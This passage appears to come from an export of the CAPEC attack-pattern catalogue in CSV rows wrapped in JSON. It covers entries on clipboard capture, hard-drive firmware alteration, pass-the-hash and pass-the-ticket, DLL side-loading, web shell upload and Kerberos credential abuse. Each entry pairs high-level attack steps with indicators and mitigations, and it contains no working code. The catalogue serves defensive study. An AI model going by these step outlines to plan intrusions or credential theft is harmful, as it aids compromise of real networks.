clipboard::STEP:3:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any sensitive information found to carry out a follow-up attack::\",\"::The adversary must have a means (i.e., a pre-installed tool or background process) by which to collect data from the clipboard and store it. That is, when the target copies data to the clipboard (e.g., to paste into another application), the adversary needs some means of capturing that data in a third location.::\",\"::SKILL:To deploy a hidden process or malware on the system to automatically collect clipboard data.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::While copying and pasting of data with the clipboard is a legitimate and practical function, certain situations and context may require the disabling of this feature. Just as certain applications disable screenshot capability, applications that handle highly sensitive information should consider disabling copy and paste functionality.::Employ a robust identification and audit/blocking via using an allowlist of applications on your system. Malware may contain the functionality associated with this attack pattern.::\",\"\",\"::267::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1115:ENTRY NAME:Clipboard Data::\",\"\",\n638,\"Altered Component Firmware\",Detailed,Stable,\"An adversary exploits systems features and/or improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), with the goal of executing malicious code from within the component's Master Boot Record (MBR). Conducting this type of attack entails the adversary infecting the target with firmware altering malware, using known tools, and a payload. Once this malware is executed, the MBR is modified to include instructions to execute the payload at desired intervals and when the system is booted up. A successful attack will obtain persistence within the victim system even if the operating system is reinstalled and/or if the component is formatted or has its data erased.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:452::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Select Target] The adversary searches for a suitable target to attack, such as government and/or private industry organizations.:TECHNIQUE:Conduct reconnaissance to determine potential targets to exploit.::STEP:2:PHASE:Explore:DESCRIPTION:[Identify Components] After selecting a target, the adversary determines whether a vulnerable component, such as a specific make and model of a HDD, is contained within the target system.:TECHNIQUE:[Remote Access Vector] The adversary gains remote access to the target, typically via additional malware, and explores the system to determine hardware components that are being leveraged.:TECHNIQUE:[Physical Access Vector] The adversary intercepts components in transit and determines if the component is vulnerable to attack.::STEP:3:PHASE:Experiment:DESCRIPTION:[Optional: Create Payload] If not using an already existing payload, the adversary creates their own to be executed at defined intervals and upon system boot processes. This payload may then be tested on the target system or a test system to confirm its functionality.::STEP:4:PHASE:Exploit:DESCRIPTION:[Insert Firmware Altering Malware] Once a vulnerable component has been identified, the adversary leverages known malware tools to infect the component's firmware and drop the payload within the component's MBR. This allows the adversary to maintain persistence on the target and execute the payload without being detected.:TECHNIQUE:The adversary inserts the firmware altering malware on the target component, via the use of known malware tools.:TECHNIQUE:[Physical Access Vector] The adversary then sends the component to its original intended destination, where it will be installed onto a victim system.::\",\"::Advanced knowledge about the target component's firmware::Advanced knowledge about Master Boot Records (MBR)::Advanced knowledge about tools used to insert firmware altering malware.::Advanced knowledge about component shipments to the target organization.::\",\"::SKILL:Ability to access and reverse engineer hardware component firmware.:LEVEL:High::SKILL:Ability to intercept components in transit.:LEVEL:High::SKILL:Ability to create malicious payload to be executed from MBR.:LEVEL:Medium::SKILL:Ability to leverage known malware tools to infect target system and insert firmware altering malware/payload:LEVEL:Low::\",\"::Manufacturer source code for hardware components.::Malware tools used to insert malware and payload onto target component.::Either remote or physical access to the target component.::\",\"::Output observed from processes, API calls, or Self-Monitoring, Analysis and Reporting Technology (SMART) may provide insight into malicious modifications of MBRs.::Digital forensics tools may produce output that indicates an attack of this nature has occurred. Examples include unexpected disk partitions and/or unusual strings.::\",\"::SCOPE:Authentication:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::\",\"::Leverage hardware components known to not be susceptible to these types of attacks.::Implement hardware RAID infrastructure.::\",\"::In 2014, the Equation group was observed levering known malware tools to conduct component firmware alteration attacks against hard drives. In total, 12 HDD categories were shown to be vulnerable from manufacturers such as Western Digital, HGST, Samsung, and Seagate. Because of their complexity, only a few victims were targeted by these attacks. [REF-664]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1542.002:ENTRY NAME:Pre-OS Boot:Component Firmware::\",\"\",\n639,\"Probe System Files\",Detailed,Stable,\"An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:545::\",\"\",\"::An adversary has access to the file system of a system.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Verify that files have proper access controls set, and reduce the storage of sensitive information to only what is necessary.::\",\"::Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.::Adversaries may search network shares on computers they have compromised to find files of interest.::\",\"::552::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1039:ENTRY NAME:Data from Network Shared Drive::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.001:ENTRY NAME:Unsecured Credentials: Credentials in Files::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.003:ENTRY NAME:Unsecured Credentials: Bash History::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials: Private Keys::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.006:ENTRY NAME:Unsecured Credentials: Group Policy Preferences::\",\"\",\n640,\"Inclusion of Code in Existing Process\",Detailed,Stable,\"The adversary takes advantage of a bug in an application failing to verify the integrity of the running process to execute arbitrary code in the address space of a separate live process. The adversary could use running code in the context of another process to try to access process's memory, system/network resources, etc. The goal of this attack is to evade detection defenses and escalate privileges by masking the malicious code under an existing legitimate process. Examples of approaches include but not limited to: dynamic-link library (DLL) injection, portable executable injection, thread execution hijacking, ptrace system calls, VDSO hijacking, function hooking, reflective code loading, and more.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:251::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target process] The adversary determines a process with sufficient privileges that they wish to include code into.:TECHNIQUE:On Windows, use the process explorer's security tab to see if a process is running with administror privileges.:TECHNIQUE:On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to include simple code with known output] The adversary attempts to include very simple code into the existing process to determine if the code inclusion worked. The code will differ based on the approach used to include code into an existing process.::STEP:3:PHASE:Exploit:DESCRIPTION:[Include arbitrary code into existing process] Once an adversary has determined that including code into the existing process is possible, they will include code for a targeted purpose, such as accessing that process's memory.::\",\"::The targeted application fails to verify the integrity of the running process that allows an adversary to execute arbitrary code.::\",\"::SKILL:Knowledge of how to load malicious code into the memory space of a running process, as well as the ability to have the running process execute this code. For example, with DLL injection, the adversary must know how to load a DLL into the memory space of another running process, and cause this process to execute the code inside of the DLL.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Read Data::\",\"::Prevent unknown or malicious software from loading through using an allowlist policy.::Properly restrict the location of the software being used.::Leverage security kernel modules providing advanced access control and process restrictions like SELinux.::Monitor API calls like CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and similar for Windows.::Monitor API calls like ptrace system call, use of LD_PRELOAD environment variable, dlfcn dynamic linking API calls, and similar for Linux.::Monitor API calls like SetWindowsHookEx and SetWinEventHook which install hook procedures for Windows.::Monitor processes and command-line arguments for unknown behavior related to code injection.::\",\"\",\"::114::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.005:ENTRY NAME:Server Software Component: Terminal Services DLL::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.006:ENTRY NAME:Hijack Execution Flow: Dynamic Linker Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.013:ENTRY NAME:Hijack Execution Flow: KernelCallbackTable::::TAXONOMY NAME:ATTACK:ENTRY ID:1620:ENTRY NAME:Reflective Code Loading::\",\"\",\n641,\"DLL Side-Loading\",Detailed,Stable,\"An adversary places a malicious version of a Dynamic-Link Library (DLL) in the Windows Side-by-Side (WinSxS) directory to trick the operating system into loading this malicious DLL instead of a legitimate DLL. Programs specify the location of the DLLs to load via the use of WinSxS manifests or DLL redirection and if they aren't used then Windows searches in a predefined set of directories to locate the file. If the applications improperly specify a required DLL or WinSxS manifests aren't explicit about the characteristics of the DLL to be loaded, they can be vulnerable to side-loading.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:159::\",\"\",\"::The target must fail to verify the integrity of the DLL before using them.::\",\"::SKILL:Trick the operating system in loading a malicious DLL instead of a legitimate DLL.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Prevent unknown DLLs from loading through using an allowlist policy.::Patch installed applications as soon as new updates become available.::Properly restrict the location of the software being used.::Use of sxstrace.exe on Windows as well as manual inspection of the manifests.::Require code signing and avoid using relative paths for resources.::\",\"\",\"::706::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.002:ENTRY NAME:Hijack Execution Flow:DLL Side-Loading::\",\"\",\n642,\"Replace Binaries\",Detailed,Draft,\"Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The attacker must be able to place the malicious binary on the target machine.::\",\"\",\"\",\"\",\"\",\"::Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services.::\",\"::The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.::By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:Windowssystem32. This value is set in the registry at HKEY_CURRENT_USERControl PanelDesktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently.::\",\"::732::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.005:ENTRY NAME:Server Software Component: Terminal Services DLL::::TAXONOMY NAME:ATTACK:ENTRY ID:1554:ENTRY NAME:Compromise Client Software Binary::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.005:ENTRY NAME:Hijack Execution Flow:Executable Installer File Permissions Weakness::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Binary planting::\",\"\","
  },
  "doc-147ff05921451c83f725143e2500d092": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n643,\"Identify Shared Files/Directories on System\",Detailed,Draft,\"An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:309::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:545::NATURE:CanPrecede:CAPEC ID:165::\",\"\",\"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::\",\"::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line. The adversary, or their malware, can simply employ a set of commands that search for shared drives on the system (e.g., net view remote system or net share).:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is potentially able to identify the location of sensitive information or lateral pathways through the network.::\",\"::Identify unnecessary system utilities or potentially malicious software that may contain functionality to identify network share information, and audit and/or block them by using allowlist tools.::\",\"\",\"::267::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1135:ENTRY NAME:Network Share Discovery::\",\"\",\n644,\"Use of Captured Hashes (Pass The Hash)\",Detailed,Stable,\"An adversary obtains (i.e. steals or purchases) legitimate Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:653::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:545::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows credential hash value pairs] The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain.:TECHNIQUE:An adversary purchases breached Windows credential hash value pairs from the dark web.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows credential hash value pair until the target grants access.:TECHNIQUE:Manually or automatically enter each Windows credential hash value pair through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::\",\"::The system/application is connected to the Windows domain.::The system/application leverages the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.::The adversary possesses known Windows credential hash value pairs that exist on the target domain.::\",\"::SKILL:Once an adversary obtains a known Windows credential hash value pair, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known Window credential hash value pairs for the targeted domain.::\",\"::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Monitor system and domain logs for abnormal credential access.::Create a strong password policy and ensure that your system enforces this policy.::Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain.::\",\"::Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]::Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]::\",\"::522::836::308::294::308::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1550.002:ENTRY NAME:Use Alternate Authentication Material:Pass The Hash::\",\"\",\n645,\"Use of Captured Tickets (Pass The Ticket)\",Detailed,Stable,\"An adversary uses stolen Kerberos tickets to access systems/resources that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system/resource without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::\",\"\",\"::The adversary needs physical access to the victim system.::The use of a third-party credential harvesting tool.::\",\"::SKILL:Determine if Kerberos authentication is used on the server.:LEVEL:Low::SKILL:The adversary uses a third-party tool to obtain the necessary tickets to execute the attack.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Gain Privileges::\",\"::Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.::Monitor system and domain logs for abnormal access.::\",\"::Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]::\",\"::522::294::308::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1550.003:ENTRY NAME:Use Alternate Authentication Material:Pass The Ticket::\",\"\",\n646,\"Peripheral Footprinting\",Standard,Stable,\"Adversaries may attempt to obtain information about attached peripheral devices and components connected to a computer system. Examples may include discovering the presence of iOS devices by searching for backups, analyzing the Windows registry to determine what USB devices have been connected, or infecting a victim system with malware to report when a USB device has been connected. This may allow the adversary to gain additional insight about the system or network environment, which may be useful in constructing further attacks.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary needs either physical or remote access to the victim system.::\",\"::SKILL:The adversary needs to be able to infect the victim system in a manner that gives them remote access.:LEVEL:Medium::SKILL:If analyzing the Windows registry, the adversary must understand the registry structure to know where to look for devices.:LEVEL:Medium::\",\"\",\"\",\"\",\"::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1120:ENTRY NAME:Peripheral Device Discovery::\",\"\",\n647,\"Collect Data from Registries\",Detailed,Draft,\"An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Gain logical access to system] An adversary must first gain logical access to the system it wants to gather registry information from,:TECHNIQUE:Obtain user account credentials and access the system:TECHNIQUE:Plant malware on the system that will give remote logical access to the adversary::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine if the permissions are correct] Once logical access is gained, an adversary will determine if they have the proper permissions, or are authorized, to view registry information. If they do not, they will need to escalate privileges on the system through other means::STEP:3:PHASE:Experiment:DESCRIPTION:[Peruse registry for information] Once an adversary has access to a registry, they will gather all system-specific data and sensitive information that they deem useful.::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack::\",\"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::The adversary must have capability to navigate the operating system to peruse the registry.::\",\"::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is able to read sensitive information about the system in the registry.::\",\"::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking via using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::\",\"\",\"::285::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::::TAXONOMY NAME:ATTACK:ENTRY ID:1012:ENTRY NAME:Query Registry::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.002:ENTRY NAME:Unsecured Credentials: Credentials in Registry::\",\"\",\n648,\"Collect Data from Screen Capture\",Detailed,Draft,\"An adversary gathers sensitive information by exploiting the system's screen capture functionality. Through screenshots, the adversary aims to see what happens on the screen over the course of an operation. The adversary can leverage information gathered in order to carry out further attacks.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:150::\",\"\",\"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::\",\"::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only to leverage the relevant command for screen capture.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is able to capture potentially sensitive information and processes as they appear on the screen.::\",\"::Identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using allowlist tools.::While screen capture is a legitimate and practical function, certain situations and context may require the disabling of this feature.::\",\"\",\"::267::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1113:ENTRY NAME:Screen Capture::::TAXONOMY NAME:ATTACK:ENTRY ID:1513:ENTRY NAME:Screen Capture::\",\"\",\n649,\"Adding a Space to a File Extension\",Detailed,Draft,\"An adversary adds a space character to the end of a file extension and takes advantage of an application that does not properly neutralize trailing special elements in file names. This extra space, which can be difficult for a user to notice, affects which default application is used to operate on the file and can be leveraged by the adversary to control execution.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:635::\",\"\",\"::The use of the file must be controlled by the file extension.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::File extensions should be checked to see if non-visible characters are being included.::\",\"\",\"::46::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.006:ENTRY NAME:Masquerading:Space after Filename::\",\"\",\n65,\"Sniff Application Code\",Detailed,Draft,\"An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:157::NATURE:CanPrecede:CAPEC ID:37::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Set up a sniffer] The adversary sets up a sniffer in the path between the server and the client and watches the traffic.:TECHNIQUE:The adversary sets up a sniffer in the path between the server and the client.::STEP:2:PHASE:Exploit:DESCRIPTION:[Capturing Application Code Bound During Patching]adversary knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The adversary loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The adversary then proceeds to reverse engineer the captured code.:TECHNIQUE:adversary loads the sniffer to capture the application code bound during a dynamic update.:TECHNIQUE:The adversary proceeds to reverse engineer the captured code.::\",\"::The attacker must have the ability to place themself in the communication path between the client and server.::The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.::The attacker must be able to employ a sniffer on the network without being detected.::\",\"::SKILL:The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ an adversary-in-the-middle attack (CAPEC-94), the client or server must not realize this. Finally, the attacker needs to regenerate source code from binary code if the need be.:LEVEL:Medium::\",\"::The Attacker needs the ability to capture communications between the client being updated and the server providing the update. In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Encrypt all communication between the client and server.::Implementation: Use SSL, SSH, SCP.::Operation: Use ifconfig/ipconfig or other tools to detect the sniffer installed in the network.::\",\"::Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..::Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such.::\",\"::319::311::318::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::\",\"\",\n650,\"Upload a Web Shell to a Web Server\",Detailed,Draft,\"By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a gateway to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Make sure your web server is up-to-date with all patches to protect against known vulnerabilities.::Ensure that the file permissions in directories on the web server from which files can be execute is set to the least privilege settings, and that those directories contents is controlled by an allowlist.::\",\"\",\"::287::553::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.003:ENTRY NAME:Server Software Component:Web Shell::\",\"\",\n651,\"Eavesdropping\",Standard,Draft,\"An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:117::\",\"\",\"::The adversary typically requires physical proximity to the target's environment, whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping, if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally.::\",\"\",\"::For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:The adversary gains unauthorized access to information.::\",\"::Be mindful of your surroundings when discussing sensitive information in public areas.::Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity, and implement patches as soon as they become available.::If possible, physically disable the microphone on your machine if it is not needed.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1111:ENTRY NAME:Multi-Factor Authentication Interception::\",\"\",\n652,\"Use of Known Kerberos Credentials\",Standard,Draft,\"An adversary obtains (i.e. steals or purchases) legitimate Kerberos credentials (e.g. Kerberos service account userID/password or Kerberos Tickets) with the goal of achieving authenticated access to additional systems, applications, or services within the domain.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Kerberos credentials] The adversary must obtain known Kerberos credentials in order to access the target system, application, or service within the domain.:TECHNIQUE:An adversary purchases breached Kerberos service account username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary guesses the credentials to a weak Kerberos service account.:TECHNIQUE:An adversary conducts a sniffing attack to steal Kerberos tickets as they are transmitted.:TECHNIQUE:An adversary conducts a Kerberoasting attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt Kerberos authentication] Try each Kerberos credential against various resources within the domain until the target grants access.:TECHNIQUE:Manually or automatically enter each Kerberos service account credential through the target's interface.:TECHNIQUE:Attempt a Pass the Ticket attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::\",\"::The system/application leverages Kerberos authentication.::The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication for Kerberos service accounts.::The system/application does not have a sound password policy that is being enforced for Kerberos service accounts.::The system/application does not implement an effective password throttling mechanism for authenticating to Kerberos service accounts.::The targeted network allows for network sniffing attacks to succeed.::\",\"::SKILL:Once an adversary obtains a known Kerberos credential, leveraging it is trivial.:LEVEL:Low::\",\"::A valid Kerberos ticket or a known Kerberos service account credential.::\",\"::Authentication attempts use expired or invalid credentials.::Authentication attempts are originating from IP addresses or locations that are inconsistent with an account's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain 